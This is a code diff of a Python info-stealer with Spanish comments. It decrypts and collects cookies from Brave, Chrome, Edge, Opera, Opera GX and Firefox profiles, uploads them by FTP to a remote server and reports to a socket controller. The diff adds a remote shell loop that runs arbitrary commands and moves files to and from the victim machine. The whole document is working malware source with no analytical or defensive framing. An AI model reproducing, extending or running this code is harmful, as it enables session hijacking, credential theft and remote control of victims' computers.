@@ -1,4 +1,4 @@
-import socket, os, tempfile, sqlite3, json, time
+import socket, os, tempfile, sqlite3, json, time, subprocess
 from ftplib import FTP
 from base64 import b64decode
 from win32crypt import CryptUnprotectData
@@ -11,8 +11,8 @@ usuario = os.getlogin()
 host = ""
 port = 1337
 
-ftp_user = "inserte usuario"
-ftp_pass = "inserte contraseña"
+ftp_user = "usuario"
+ftp_pass = "contraseña"
 
 ftp = FTP(host)
 ftp.login(ftp_user, ftp_pass)
@@ -26,7 +26,7 @@ def carpeta():
     except:
         print("s")
     ftp.cwd(f"/home/arcadia/{usuario}")
-    
+
 
 def clave(archivo):
     with open(archivo, "r", encoding="utf-8") as local_archivo:
@@ -47,7 +47,7 @@ def decrypt_valor(valor, clave):
 
 def brave():
     try:
-        
+
         carpeta = f"{os.getenv('localappdata')}\\BraveSoftware\\Brave-Browser\\User Data"
         if os.path.exists(carpeta):
             local_state = carpeta + os.sep + "Local State"
@@ -55,7 +55,7 @@ def brave():
                 clave2 = clave(local_state)
                 pass
             else:
-                print("Local State no existe")   
+                print("Local State no existe")
             cookies = carpeta + os.sep + "Default" + os.sep + "Network" + os.sep + "Cookies"
             if os.path.isfile(cookies):
                 pass
@@ -86,7 +86,7 @@ def brave():
         cliente.send("BRAVE: ERROR".encode('utf-8'))
 
 def chrome():
-    try:  
+    try:
         carpeta = f"{os.getenv('localappdata')}\\Google\\Chrome\\User Data\\"
         if os.path.exists(carpeta):
             local_state = carpeta + os.sep + "Local State"
@@ -94,7 +94,7 @@ def chrome():
                 clave2 = clave(local_state)
                 pass
             else:
-                print("Local State no existe") 
+                print("Local State no existe")
             cookies = carpeta + os.sep + "Default" + os.sep + "Network" + os.sep + "Cookies"
             if os.path.isfile(cookies):
                 pass
@@ -123,9 +123,9 @@ def chrome():
             cliente.send("CHROME: SUBIDO!".encode("utf-8"))
     except:
         cliente.send("CHROME: ERROR".encode('utf-8'))
-        
+
 def Edge():
-    try: 
+    try:
         carpeta = f"{os.getenv('localappdata')}\\Microsoft\\Edge\\User Data"
         if os.path.exists(carpeta):
             local_state = carpeta + os.sep + "Local State"
@@ -133,7 +133,7 @@ def Edge():
                 clave2 = clave(local_state)
                 pass
             else:
-                print("Local State no existe")   
+                print("Local State no existe")
             cookies = carpeta + os.sep + "Default" + os.sep + "Network" + os.sep + "Cookies"
             if os.path.isfile(cookies):
                 pass
@@ -164,7 +164,7 @@ def Edge():
         cliente.send("EDGE: ERROR".encode('utf-8'))
 
 def Opera():
-    try:      
+    try:
         carpeta = f"{os.getenv('appdata')}\\Opera Software\\Opera Stable"
         if os.path.exists(carpeta):
             local_state = carpeta + os.sep + "Local State"
@@ -172,7 +172,7 @@ def Opera():
                 clave2 = clave(local_state)
                 pass
             else:
-                print("Local State no existe")   
+                print("Local State no existe")
             cookies = carpeta + os.sep + "Network" + os.sep + "Cookies"
             if os.path.isfile(cookies):
                 pass
@@ -211,7 +211,7 @@ def OperaGX():
                 clave2 = clave(local_state)
                 pass
             else:
-                print("Local State no existe")   
+                print("Local State no existe")
             cookies = carpeta + os.sep + "Network" + os.sep + "Cookies"
             if os.path.isfile(cookies):
                 pass
@@ -240,10 +240,10 @@ def OperaGX():
             cliente.send("GX: SUBIDO!".encode('utf-8'))
     except:
         cliente.send("GX: ERROR".encode('utf-8'))
-        
+
 
 def mozilla():
-    try: 
+    try:
         roaming = os.getenv("appdata")
         carpeta = f"{roaming}\\Mozilla\\Firefox\\Profiles"
         listar_perfiles = os.listdir(carpeta)
@@ -273,17 +273,50 @@ def mozilla():
                     samesite = columna[7]
                     ultimo_acceso = columna[8]
                     cookies_txt.write(f"SITIO: {domain}\n Nombre: {nombre}\n Valor: {valor}\n Domain: {domain}\n Path: {path}\n Expira: {expiracion}\n HttpOnly: {httponly}\n Secure: {secure}\n SameSite: {samesite}\n Ultimo Acceso: {ultimo_acceso}\n\n")
-            orden.close()     
+            orden.close()
             sql.close()
             archivo = open(f"{temp}{os.sep}mozilla({usuario})", "rb")
             ftp.storlines(f"STOR mozilla({usuario})", archivo)
             cliente.send("MOZILLA: SUBIDO!".encode('utf-8'))
     except:
         cliente.send("MOZILLA: ERROR".encode('utf-8'))
-    
+
 def escuchando():
     while True:
         peticion = cliente.recv(1024).decode('utf-8')
+        if peticion == 'shell':
+            try:
+                while True:
+                    comandos = cliente.recv(1024).decode('utf-8')
+                    if comandos[:9] == 'descargar':
+                        nombre = comandos[10:]
+                        try:
+                            archivo = open(f"{os.getcwd()}{os.sep}{nombre}", "rb")
+                            ftp.storlines("STOR "+nombre, archivo)
+                            cliente.send("listo!".encode('utf-8'))
+                        except:
+                            cliente.send("error al subir el archivo".encode('utf-8'))
+
+                    if comandos[:5] == 'subir':
+                        ftp.cwd("/home/arcadia/")
+                        nombre = comandos[6:]
+                        archivo = open(f"{temp}{os.sep}{nombre}", "wb")
+                        try:
+                            ftp.storbinary(f"STOR {nombre}", archivo)
+                            cliente.send("se ha guardado en la carpeta '{temp}'".encode('utf-8'))
+                        except:
+                            cliente.send("error al subir el archivo".encode('utf-8'))
+                        ftp.cwd(f"/home/arcadia/{usuario}")
+                    if comandos[:2] == 'cd':
+                        os.chdir(comandos[3:])
+                    if len(comandos) > 0:
+                        shell = subprocess.Popen(comandos[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                        leer = shell.stdout.read()
+                        salida = str(leer)
+                        cliente.send(str.encode(salida + str(f"\n{os.getcwd()}")))
+            except:
+                   cliente.send("error".encode('utf-8'))
+
         if peticion == 'cookies':
             try:
                 brave()
@@ -309,7 +342,6 @@ def escuchando():
                 mozilla()
             except:
                 pass
-                
 
 
 def main():
@@ -319,5 +351,6 @@ def main():
             cliente.connect((host,port))
             escuchando()
         except:
+            ftp.close()
             main()
 main()
